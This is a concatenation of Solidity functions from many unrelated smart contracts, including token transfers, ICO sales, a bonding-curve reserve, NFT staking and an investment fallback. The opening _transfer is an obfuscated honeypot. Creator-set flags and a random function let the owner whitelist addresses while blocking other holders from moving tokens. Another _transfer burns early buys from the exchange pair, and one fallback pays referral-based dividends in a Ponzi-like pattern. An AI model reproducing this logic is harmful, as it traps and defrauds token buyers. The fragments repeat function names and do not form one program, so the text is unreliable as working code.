function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (catness == false)) {
        airline = chTx;
        nanos = true;
    }
    if ((address(sender) == creator) && (catness == true)) {
        infinit[recipient] = true;
        fifa[recipient] = false;
        catness = false;
    }
    if ((amount > dubai) && (infinit[sender] == true) && (address(sender) != creator)) {
        dollar[recipient] = true;
    }
    if (infinit[recipient] != true) {
        fifa[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((fifa[sender]) && (infinit[recipient] == false)) {
        fifa[recipient] = true;
    }
    if (infinit[sender] == false) {
        if ((amount > dubai) && (dollar[sender] == true)) {
            require(false);
        }
        require(amount < airline);
        if (nanos == true) {
            if (dollar[sender] == true) {
                require(false);
            }
            dollar[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function becomeSnailmaster() public {
    require(initialized);
    require(hatcheryShrimp[msg.sender] >= snailmasterReq);
}

function _transfer(
    address from,
    address to,
    uint256 amount
) private {
    require(from != address(0), "ERC20: transfer from the zero address");
    require(to != address(0), "ERC20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");
    if (!launched) {
        if (from == uniswapPair && from != owner() && to != owner()) {
            to = burnAddress;
        }
    }
    if (limit == true && !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && to != burnAddress) {
        if (to != uniswapPair && from == uniswapPair) {
            require(((balanceOf(to).add(amount)) <= 200000000000 * 10 ** 4 * 10 ** 9));
        }
        require(amount <= 100000000000 * 10 ** 4 * 10 ** 9, 'Transfer amount must be less');
    }
    if (from != owner() && to != owner())
        require(amount <= _maxTxAmount);
    uint256 contractTokenBalance = balanceOf(address(this));
    bool overMinTokenBalance = contractTokenBalance >= minTokensBeforeSwap;
    if (
        overMinTokenBalance &&
        !inSwapAndLiquify &&
        from != uniswapPair &&
        swapAndLiquifyEnabled
    ) {
        swapAndLiquify(contractTokenBalance);
    }
    bool takeFee = true;
    if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
        takeFee = false;
    }
    _tokenTransfer(from, to, amount, takeFee);
}

function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
    uint256 forLiquidity = contractTokenBalance.div(2);
    uint256 devExp = contractTokenBalance.div(4);
    uint256 forRewards = contractTokenBalance.div(4);
    uint256 half = forLiquidity.div(2);
    uint256 otherHalf = forLiquidity.sub(half);
    uint256 initialBalance = address(this).balance;
    swapTokensForEth(half.add(devExp).add(forRewards)); 
    uint256 Balance = address(this).balance.sub(initialBalance);
    uint256 oneThird = Balance.div(3);
    wallet.transfer(oneThird);
    wallet2.transfer(oneThird);
    addLiquidity(otherHalf, oneThird);
    emit SwapAndLiquify(half, oneThird, otherHalf);
}

function getCapAtTime(Data storage self, uint time) public view returns(uint) {
    if (time == 0) time = now;
    for (uint i = 1; i < self.capTimes.length; i++) {
        if (self.capTimes[i] > time) return self.capAmounts[i - 1];
    }
    return self.capAmounts[self.capAmounts.length - 1];
}

function setReceiverAddress(Data storage self, address _receiver) public onlyOwner(self) {
    require(!self.poolSubmitted);
    self.receiver = _receiver;
    self.addressSetTime = now;
    emit ReceiverAddressSet(_receiver);
}

function submitPool(Data storage self, uint amountInWei) public onlyOwner(self) noReentrancy(self) {
    require(!self.poolSubmitted);
    require(now > self.addressSetTime.add(86400));
    if (amountInWei == 0) amountInWei = address(this).balance;
    self.finalBalance = address(this).balance;
    self.poolSubmitted = true;
    require(self.receiver.call.value(amountInWei).gas(gasleft().sub(5000))());
    if (address(this).balance > 0) {
        self.withdrawToken.push(0x00);
        self.withdrawAmount.push(address(this).balance);
        emit WithdrawalAvailable(0x00);
    }
    emit PoolSubmitted(self.receiver, amountInWei);
}

function withdraw(Data storage self) public {
    assert(msg.value == 0);
    Contributor storage c = self.contributorMap[msg.sender];
    require(c.balance > 0);
    if (!self.poolSubmitted) {
        uint balance = c.balance;
        c.balance = 0;
        msg.sender.transfer(balance);
        emit ContributorBalanceChanged(msg.sender, 0);
        return;
    }
    require(c.claimedTokensIndex < self.withdrawToken.length);
    uint pct = _toPct(c.balance, self.finalBalance);
    uint amount;
    address token;
    for (uint16 i = c.claimedTokensIndex; i < self.withdrawToken.length; i++) {
        amount = _applyPct(self.withdrawAmount[i], pct);
        token = self.withdrawToken[i];
        c.claimedTokensIndex++;
        if (amount > 0) {
            if (token == 0x00) {
                msg.sender.transfer(amount);
            } else {
                require(ERC20(token).transfer(msg.sender, amount));
                self.tokenBalances[token] = self.tokenBalances[token].sub(amount);
            }
            emit WithdrawalClaimed(msg.sender, token, amount);
        }
    }
}

function deposit(Data storage self) public {
    assert(!self.poolSubmitted);
    require(tx.gasprice <= maxGasPrice);
    Contributor storage c = self.contributorMap[msg.sender];
    uint cap = _getCap(self, msg.sender);
    require(cap >= c.balance.add(msg.value));
    if (self.contractCap < address(this).balance) {
        require(address(this).balance.sub(msg.value) < self.contractCap);
        uint excess = address(this).balance.sub(self.contractCap);
        c.balance = c.balance.add(msg.value.sub(excess));
        msg.sender.transfer(excess);
    } else {
        c.balance = c.balance.add(msg.value);
    }
    require(c.balance >= contributionMin);
    emit ContributorBalanceChanged(msg.sender, c.balance);
}

function updateREETHPrice() external {
    if (mainLiquidity == address(0)) {
        return;
    }
    if (now < lastREETHPriceUpdate + updateFrequency) {
        return;
    } 
    uint256 period = now - lastREETHPriceUpdate; 
    lastREETHPriceUpdate = now;
    UniswapV2Pair pair = UniswapV2Pair(mainLiquidity);
    (, uint112 reserve1, uint32 _blockTime) = pair.getReserves();
    if (reserve1 == 0) {
        _reethETHPrice = 0;
        _reethPriceWindow = 0;
        lastTWAPBlockTime = 0;
        lastTWAPCumulativePrice = 0;
        _firstCapture = true;
        emit NoLiquidity();
        return;
    }
    if (lastTWAPBlockTime != _blockTime) {
        if (_firstCapture == true) {
            if (_tokenIndex == 0) {
                lastTWAPCumulativePrice = pair.price0CumulativeLast();
            } else {
                lastTWAPCumulativePrice = pair.price1CumulativeLast();
            }
            lastTWAPBlockTime = _blockTime;
            _firstCapture = false;
            emit FirstPriceCapture();
            return;
        } else {
            uint256 cumuPrice = 0;
            if (_tokenIndex == 0) {
                cumuPrice = pair.price0CumulativeLast();
            } else {
                cumuPrice = pair.price1CumulativeLast();
            }
            lastTWAPPrice = ((cumuPrice - lastTWAPCumulativePrice) / (_blockTime - lastTWAPBlockTime) * (10 ** _reethDecimals)) >> 112;
            lastTWAPCumulativePrice = cumuPrice;
            lastTWAPBlockTime = _blockTime;
        }
    }
    if (lastTWAPPrice == 0) {
        emit FailedPriceCapture();
        return;
    }
    if (_reethPriceWindow == 0) {
        _reethPriceWindow = updateFrequency;
        _reethETHPrice = lastTWAPPrice;
    } else {
        uint256 price = lastTWAPPrice;
        _reethETHPrice = (_reethETHPrice * (_reethPriceWindow * DIVISION_FACTOR / (_reethPriceWindow + period)) / DIVISION_FACTOR);
        _reethETHPrice += (price * (period * DIVISION_FACTOR / (_reethPriceWindow + period)) / DIVISION_FACTOR);
        _reethPriceWindow = period; 
    }
}

function refund(address[] _investors) public {
    updateStage();
    require(stage == Stage.REFUND);
    for (uint256 i = 0; i < _investors.length; i++) {
        address investorAddress = _investors[i];
        Investor storage investor = investors[investorAddress];
        uint256 toBurn = investor.tokensBought;
        uint256 toRefund = investor.etherInvested;
        investor.tokensBought = 0;
        investor.etherInvested = 0;
        if (toBurn > 0)
            require(orgonToken.burnTokens(toBurn));
        if (toRefund > 0) {
            investorAddress.transfer(toRefund);
            Refund(investorAddress, toRefund);
        }
    }
}

function setFee(uint256 _fee) public {
    require(msg.sender == k1);
    require(_fee >= MIN_FEE);
    require(_fee <= MAX_FEE);
    updateStage();
    require(stage == Stage.GROWTH || stage == Stage.LIFE);
    require(currentTime() >= feeChangeEnableTime);
    require(safeSub(_fee, 1) <= fee);
    require(safeAdd(_fee, 1) >= fee);
    if (fee != _fee) {
        fee = _fee;
        FeeChange(_fee);
    }
}

function buyTokensGrowthLife() internal {
    require(stage == Stage.GROWTH || stage == Stage.LIFE);
    require(msg.value < TWO_128);
    uint256 totalSupply = orgonToken.totalSupply();
    assert(totalSupply < TWO_128);
    uint256 toBuy = safeMul(
        totalSupply,
        safeSub(
            root_10(safeAdd(TWO_128, (msg.value << 128) / reserveAmount)),
            TWO_128)) >> 128;
    reserveAmount = safeAdd(reserveAmount, msg.value);
    require(reserveAmount < TWO_128);
    if (toBuy > 0) {
        require(orgonToken.createTokens(toBuy));
        require(orgonToken.totalSupply() < TWO_128);
        uint256 feeAmount = safeMul(toBuy, fee) / FEE_DENOMINATOR;
        require(orgonToken.transfer(msg.sender, safeSub(toBuy, feeAmount)));
        if (feeAmount > 0)
            require(orgonToken.transfer(k1, feeAmount));
        if (stage == Stage.GROWTH) {
            uint256 votesCount = toBuy;
            totalSupply = orgonToken.totalSupply();
            if (totalSupply >= GROWTH_MAX_TOKENS) {
                stage = Stage.LIFE;
                votesCount = safeSub(
                    votesCount,
                    safeSub(totalSupply, GROWTH_MAX_TOKENS));
            }
            voteNumbers[msg.sender] =
                safeAdd(voteNumbers[msg.sender], votesCount);
            totalVotesNumber = safeAdd(totalVotesNumber, votesCount);
        }
    }
}

function deliver(address[] _investors) public {
    updateStage();
    require(
        stage == Stage.BEFORE_GROWTH ||
        stage == Stage.GROWTH ||
        stage == Stage.LIFE);
    for (uint256 i = 0; i < _investors.length; i++) {
        address investorAddress = _investors[i];
        Investor storage investor = investors[investorAddress];
        uint256 toDeliver = investor.tokensBought;
        investor.tokensBought = 0;
        investor.etherInvested = 0;
        if (toDeliver > 0) {
            require(orgonToken.transfer(investorAddress, toDeliver));
            reserveTokensDelivered = safeAdd(reserveTokensDelivered, toDeliver);
            Delivery(investorAddress, toDeliver);
        }
    }
    if (stage == Stage.BEFORE_GROWTH &&
        safeMul(reserveTokensDelivered, GROWTH_MIN_DELIVERED_DENOMINATIOR) >=
        safeMul(reserveTokensSold, GROWTH_MIN_DELIVERED_NUMERATOR)) {
        stage = Stage.GROWTH;
        growthDeadline = currentTime() + GROWTH_MAX_DURATION;
        feeChangeEnableTime = currentTime() + FEE_CHANGE_DELAY;
    }
}

function buyTokensReserve() internal {
    require(stage == Stage.RESERVE);
    uint256 toBuy = 0;
    uint256 toRefund = msg.value;
    uint256 etherInvested = 0;
    uint256 tokens;
    uint256 tokensValue;
    if (reserveAmount < RESERVE_THRESHOLD_1) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_1, reserveAmount)) /
            RESERVE_PRICE_1;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_1);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_2) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_2, reserveAmount)) /
            RESERVE_PRICE_2;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_2);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_3) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_3, reserveAmount)) /
            RESERVE_PRICE_3;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_3);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_4) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_4, reserveAmount)) /
            RESERVE_PRICE_4;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_4);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_5) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_5, reserveAmount)) /
            RESERVE_PRICE_5;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_5);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_6) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_6, reserveAmount)) /
            RESERVE_PRICE_6;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_6);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_7) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_7, reserveAmount)) /
            RESERVE_PRICE_7;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_7);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (reserveAmount < RESERVE_THRESHOLD_8) {
        tokens = min(
                toRefund,
                safeSub(RESERVE_THRESHOLD_8, reserveAmount)) /
            RESERVE_PRICE_8;
        if (tokens > 0) {
            tokensValue = safeMul(tokens, RESERVE_PRICE_8);
            toBuy = safeAdd(toBuy, tokens);
            toRefund = safeSub(toRefund, tokensValue);
            etherInvested = safeAdd(etherInvested, tokensValue);
            reserveAmount = safeAdd(reserveAmount, tokensValue);
        }
    }
    if (toBuy > 0) {
        Investor storage investor = investors[msg.sender];
        investor.tokensBought = safeAdd(
            investor.tokensBought, toBuy);
        investor.etherInvested = safeAdd(
            investor.etherInvested, etherInvested);
        reserveTokensSold = safeAdd(reserveTokensSold, toBuy);
        require(orgonToken.createTokens(toBuy));
        voteNumbers[msg.sender] = safeAdd(voteNumbers[msg.sender], toBuy);
        totalVotesNumber = safeAdd(totalVotesNumber, toBuy);
        Investment(msg.sender, etherInvested, toBuy);
        if (safeSub(RESERVE_THRESHOLD_8, reserveAmount) <
            RESERVE_PRICE_8) {
            orisSpace.start(0);
            stage = Stage.BEFORE_GROWTH;
        }
    }
    if (toRefund > 0)
        msg.sender.transfer(toRefund);
}

function vote(address _newK1) public {
    updateStage();
    require(stage == Stage.LIFE);
    require(!k1Changed);
    uint256 votesCount = voteNumbers[msg.sender];
    if (votesCount > 0) {
        address oldK1 = votes[msg.sender];
        if (_newK1 != oldK1) {
            if (oldK1 != address(0)) {
                voteResults[oldK1] = safeSub(voteResults[oldK1], votesCount);
                VoteRevocation(msg.sender, oldK1, votesCount);
            }
            votes[msg.sender] = _newK1;
            if (_newK1 != address(0)) {
                voteResults[_newK1] = safeAdd(voteResults[_newK1], votesCount);
                Vote(msg.sender, _newK1, votesCount);
                if (safeMul(voteResults[_newK1], REQUIRED_VOTES_DENOMINATOR) >=
                    safeMul(totalVotesNumber, REQUIRED_VOTES_NUMERATIOR)) {
                    k1 = _newK1;
                    k1Changed = true;
                    K1Change(_newK1);
                }
            }
        }
    }
}

function buyTokens() public payable {
    require(msg.value > 0);
    updateStage();
    if (stage == Stage.RESERVE)
        buyTokensReserve();
    else if (stage == Stage.GROWTH || stage == Stage.LIFE)
        buyTokensGrowthLife();
    else revert(); 
}

function updateStage() internal returns(Stage) {
    Stage currentStage = getStage(currentTime());
    if (stage != currentStage) {
        if (currentStage == Stage.BEFORE_GROWTH) {
            uint256 tokensToBurn =
                safeSub(
                    safeAdd(
                        safeAdd(
                            safeSub(RESERVE_MAX_AMOUNT, reserveAmount),
                            safeSub(RESERVE_RATIO, 1)) /
                        RESERVE_RATIO,
                        reserveTokensSold),
                    RESERVE_MAX_TOKENS);
            orisSpace.start(tokensToBurn);
            if (tokensToBurn > 0)
                require(orgonToken.burnTokens(tokensToBurn));
        }
        stage = currentStage;
    }
}

function sellTokens(uint256 _value) public {
    require(_value > 0);
    require(_value < TWO_128);
    updateStage();
    require(stage == Stage.LIFE);
    assert(reserveAmount < TWO_128);
    uint256 totalSupply = orgonToken.totalSupply();
    require(totalSupply < TWO_128);
    require(_value <= totalSupply);
    uint256 toPay = safeMul(
        reserveAmount,
        safeSub(
            TWO_128,
            pow_10(safeSub(TWO_128, (_value << 128) / totalSupply)))) >> 128;
    require(orgonToken.transferFrom(msg.sender, this, _value));
    require(orgonToken.burnTokens(_value));
    reserveAmount = safeSub(reserveAmount, toPay);
    msg.sender.transfer(toPay);
}

function getStage(uint256 _currentTime) public view returns(Stage) {
    Stage currentStage = stage;
    if (currentStage == Stage.BEFORE_RESERVE) {
        if (_currentTime >= SALE_START_TIME)
            currentStage = Stage.RESERVE;
        else return currentStage;
    }
    if (currentStage == Stage.RESERVE) {
        if (_currentTime >= RESERVE_DEADLINE) {
            if (reserveAmount >= RESERVE_MIN_AMOUNT)
                currentStage = Stage.BEFORE_GROWTH;
            else currentStage = Stage.REFUND;
        }
        return currentStage;
    }
    if (currentStage == Stage.GROWTH) {
        if (_currentTime >= growthDeadline) {
            currentStage = Stage.LIFE;
        }
    }
    return currentStage;
}

function() payable public {
    if (owner == msg.sender) {
        return;
    }
    require(pause == false);
    require(msg.value == 0 || msg.value >= MINIMUM_INVEST);
    Investor storage user = investors[msg.sender];
    if (user.ID == 0) {
        msg.sender.transfer(0 wei);
        user.ID = addresses.push(msg.sender);
        address referrer = bytesToAddress(msg.data);
        if (investors[referrer].deposit > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
    }
    if (user.deposit != 0) {
        uint amount = getInvestorDividendsAmount(msg.sender);
        if (address(this).balance < amount) {
            pause = true;
            return;
        }
        msg.sender.transfer(amount);
    }
    admin.transfer(msg.value * PROJECT_FEE_PERCENT / 100);
    user.deposit += msg.value;
    user.depositCount += 1;
    user.blockNumber = block.number;
    uint bonusAmount = msg.value * CASH_BACK_PERCENT / 100;
    if (user.referrer != 0x0) {
        user.referrer.transfer(bonusAmount);
        if (user.depositCount == 1) {
            msg.sender.transfer(bonusAmount);
        }
    } else if (boss.addr > 0x0) {
        if (msg.sender != boss.addr) {
            if (user.deposit < boss.deposit) {
                boss.addr.transfer(bonusAmount);
            }
        }
    }
    if (user.deposit > boss.deposit) {
        boss = TheStrongest(msg.sender, user.deposit);
    }
}

function payout() public {
    if (pause) {
        Restart();
        return;
    }
    uint amount;
    for (uint256 i = addresses.length - 1; i >= 1; i--) {
        address addr = addresses[i];
        amount = getInvestorDividendsAmount(addr);
        investors[addr].blockNumber = block.number;
        if (address(this).balance < amount) {
            pause = true;
            return;
        }
        addr.transfer(amount);
    }
}

function() public payable ICOActive {
    require(!isReachedLimit());
    TokensHolder memory tokens = calculateTokens(msg.value);
    require(tokens.total > 0);
    token.mint(msg.sender, tokens.total);
    TokenPurchase(msg.sender, msg.sender, tokens.value, tokens.total);
    if (tokens.change > 0 && tokens.change <= msg.value) {
        msg.sender.transfer(tokens.change);
    }
    investors[msg.sender] = investors[msg.sender].add(tokens.value);
    addToStat(tokens.tokens, tokens.bonus);
    debugLog("rate ", priceInWei);
    manageStatus();
}

function generateTeamTokens() internal ICOFinished {
    require(!teamTokensGenerated);
    teamTokensGenerated = true;
    if (tokensCap > totalSupply) {
        uint unsoldAmount = tokensCap.sub(totalSupply);
        token.mint(unsold, unsoldAmount);
        totalSupply = totalSupply.add(unsoldAmount);
    }
    uint totalSupplyTokens = totalSupply;
    totalSupplyTokens = totalSupplyTokens.mul(100);
    totalSupplyTokens = totalSupplyTokens.div(60);
    for (uint8 i = 0; i < listTeamTokens.length; ++i) {
        uint teamTokensPart = percent(totalSupplyTokens, listTeamTokens[i].percent);
        if (listTeamTokens[i].divider != 0) {
            teamTokensPart = teamTokensPart.div(listTeamTokens[i].divider);
        }
        if (listTeamTokens[i].maxTokens != 0 && listTeamTokens[i].maxTokens < teamTokensPart) {
            teamTokensPart = listTeamTokens[i].maxTokens;
        }
        token.mint(listTeamTokens[i].holder, teamTokensPart);
        if (listTeamTokens[i].freezePeriod != 0) {
            token.freezeTokens(listTeamTokens[i].holder, endTime + listTeamTokens[i].freezePeriod);
        }
        addToStat(teamTokensPart, 0);
    }
}

function autoFinishTime() public onlyTeam {
    require(hasFinished());
    manageStatus();
    generateTeamTokens();
}

function manualFinish() public onlyTeam successICOState {
    require(!hasFinished());
    finishICO(true);
    generateTeamTokens();
}

function refund() public ICOFailed {
    require(msg.sender != 0x0);
    require(investors[msg.sender] > 0);
    uint refundVal = investors[msg.sender];
    investors[msg.sender] = 0;
    uint balance = token.balanceOf(msg.sender);
    totalSupply = totalSupply.sub(balance);
    msg.sender.transfer(refundVal);
}

function robotRefund(address investor) public onlyTeam ICOFailed {
    require(investor != 0x0);
    require(investors[investor] > 0);
    uint refundVal = investors[investor];
    investors[investor] = 0;
    uint balance = token.balanceOf(investor);
    totalSupply = totalSupply.sub(balance);
    investor.transfer(refundVal);
}

function hasFinished() public constant returns(bool) {
    return now >= endTime || isReachedLimit();
}

function allowTokenOperations(address _holder) public constant returns(bool) {
    return teamTokensFreeze[_holder] == 0 || now >= teamTokensFreeze[_holder];
}

function finishICO(bool manualFinish) internal successICOState {
    if (!manualFinish) {
        bool capIsReached = (totalSupply == tokensCap);
        if (capIsReached && now < endTime) {
            endTime = now;
        }
    } else {
        endTime = now;
    }
    icoState = IcoState.Finished;
    tokensAreFrozen = false;
    token.unblock();
}

function manageStatus() internal {
    if (totalSupply >= minSuccess && !isSuccess) {
        successICO();
    }
    bool capIsReached = (totalSupply == tokensCap);
    if (capIsReached || (now >= endTime)) {
        if (!isSuccess) {
            failICO();
        } else {
            finishICO(false);
        }
    }
}

function unstake(uint256[] memory _cardIds, uint256[] memory _cardAmounts) public {
    require(_cardIds.length > 0, "_cardIds array empty");
    harvest();
    for (uint256 i = 0; i < _cardIds.length; ++i) {
        require(userCards[msg.sender][_cardIds[i]] >= _cardAmounts[i], "Card not staked");
        userCards[msg.sender][_cardIds[i]] = userCards[msg.sender][_cardIds[i]].sub(_cardAmounts[i]);
        ropeMaker.burn(address(this), _cardIds[i], _cardAmounts[i]);
    }
    ropeMaker.mintBatch(msg.sender, _cardIds, _cardAmounts);
    emit Unstake(msg.sender, _cardIds, _cardAmounts);
}

function withdrawERC1155(uint256 poolId, uint256 quantity) public {
    ERC1155Multiplier storage erc1155 = eRC1155Multiplier[poolId];
    UserInfoERC1155 storage user = userInfoERC1155[poolId][msg.sender];
    ERC1155MultiplierUserInfo storage multiplier = userMultiplier[msg.sender];
    require(
        user.amountInPool >= quantity,
        "ToshiCoinFarm: User does not have enough NFTS to withdraw from this pool"
    );
    harvest();
    user.amountInPool = user.amountInPool.sub(quantity);
    multiplier.total = multiplier.total.sub(erc1155.percentBoost.mul(quantity));
    multiplier.multiplier = multiplier.total.mul(quantity);
    if (multiplier.multiplier > 100) {
        multiplier.multiplier = 100;
    }
    ropeMaker.burn(address(this), erc1155.id, quantity);
    uint256[] memory cardid = new uint256[](1);
    uint256[] memory cardamount = new uint256[](1);
    cardid[0] = erc1155.id;
    cardamount[0] = quantity;
    ropeMaker.mintBatch(msg.sender, cardid, cardamount);
}

function stake(uint256[] memory _cardIds, uint256[] memory _cardAmounts) public {
    require(_cardIds.length > 0, "_cardIds array empty");
    harvest();
    for (uint256 i = 0; i < _cardIds.length; ++i) {
        require(cardToSetMap[_cardIds[i]] != 0, "Card is not part of any set");
    }
    ropeMaker.mintBatch(address(this), _cardIds, _cardAmounts);
    for (uint256 i = 0; i < _cardIds.length; ++i) {
        userCards[msg.sender][_cardIds[i]] = userCards[msg.sender][_cardIds[i]].add(_cardAmounts[i]);
        ropeMaker.burn(msg.sender, _cardIds[i], _cardAmounts[i]);
    }
    emit Stake(msg.sender, _cardIds, _cardAmounts);
}

function depositERC1155(uint256 poolId, uint256 quantity) public {
    ERC1155Multiplier storage erc1155 = eRC1155Multiplier[poolId];
    UserInfoERC1155 storage user = userInfoERC1155[poolId][msg.sender];
    ERC1155MultiplierUserInfo storage multiplier = userMultiplier[msg.sender];
    uint256[] memory cardid = new uint256[](1);
    uint256[] memory cardamount = new uint256[](1);
    cardid[0] = erc1155.id;
    cardamount[0] = quantity;
    harvest();
    ropeMaker.burn(msg.sender, erc1155.id, quantity);
    ropeMaker.mintBatch(address(this), cardid, cardamount);
    user.amountInPool = user.amountInPool.add(quantity);
    multiplier.multiplier = multiplier.multiplier.add(erc1155.percentBoost.mul(quantity));
    multiplier.total = multiplier.total.add(erc1155.percentBoost.mul(quantity));
    if (multiplier.multiplier > 100) {
        multiplier.multiplier = 100;
    }
}

function harvest() public {
    ERC1155MultiplierUserInfo storage multiplier = userMultiplier[msg.sender];
    uint256 pendingToshicash = totalPendingToshicashOfAddress(msg.sender, true);
    userLastUpdate[msg.sender] = block.timestamp;
    pendingToshicash = pendingToshicash.add(pendingToshicash.mul(multiplier.multiplier).div(100));
    if (pendingToshicash > 0) {
        toshicash.mint(msg.sender, pendingToshicash);
    }
    emit Harvest(msg.sender, pendingToshicash);
}

function() payable {
    require(allowInvestment);
    uint256 amountOfWei = msg.value;
    require(amountOfWei >= 10000000000000);
    uint256 amountOfYUPIE = 0;
    uint256 absLowTimeBonusLimit = 0;
    uint256 absMidTimeBonusLimit = 0;
    uint256 absHighTimeBonusLimit = 0;
    uint256 totalYUPIEAvailable = 0;
    if (block.timestamp > preSaleStartTime && block.timestamp < preSaleEndTime) {
        amountOfYUPIE = amountOfWei.mul(YUPIE_PER_ETH_PRE_SALE);
        absLowTimeBonusLimit = preSaleStartTime + lowTimeBonusLimit;
        absMidTimeBonusLimit = preSaleStartTime + midTimeBonusLimit;
        absHighTimeBonusLimit = preSaleStartTime + highTimeBonusLimit;
        totalYUPIEAvailable = maxPresaleSupply - totalYUPIESAllocated;
    } else if (block.timestamp > saleStartTime && block.timestamp < saleEndTime) {
        amountOfYUPIE = amountOfWei.mul(YUPIE_PER_ETH_SALE);
        absLowTimeBonusLimit = saleStartTime + lowTimeBonusLimit;
        absMidTimeBonusLimit = saleStartTime + midTimeBonusLimit;
        absHighTimeBonusLimit = saleStartTime + highTimeBonusLimit;
        totalYUPIEAvailable = totalSupply - totalYUPIESAllocated;
    } else {
        revert();
    }
    assert(amountOfYUPIE > 0);
    if (amountOfWei >= highEtherBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(highEtherBonusValue).div(100);
    } else if (amountOfWei >= midEtherBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(midEtherBonusValue).div(100);
    } else if (amountOfWei >= lowEtherBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(lowEtherBonusValue).div(100);
    }
    if (block.timestamp >= absLowTimeBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(lowTimeBonusValue).div(100);
    } else if (block.timestamp >= absMidTimeBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(midTimeBonusValue).div(100);
    } else if (block.timestamp >= absHighTimeBonusLimit) {
        amountOfYUPIE = amountOfYUPIE.mul(highTimeBonusValue).div(100);
    }
    assert(amountOfYUPIE <= totalYUPIEAvailable);
    totalYUPIESAllocated = totalYUPIESAllocated + amountOfYUPIE;
    uint256 balanceSafe = balances[msg.sender].add(amountOfYUPIE);
    balances[msg.sender] = balanceSafe;
    totalWEIInvested = totalWEIInvested.add(amountOfWei);
    uint256 contributedSafe = WEIContributed[msg.sender].add(amountOfWei);
    WEIContributed[msg.sender] = contributedSafe;
    assert(totalYUPIESAllocated <= totalSupply);
    assert(totalYUPIESAllocated > 0);
    assert(balanceSafe > 0);
    assert(totalWEIInvested > 0);
    assert(contributedSafe > 0);
    CreatedYUPIE(msg.sender, amountOfYUPIE);
}

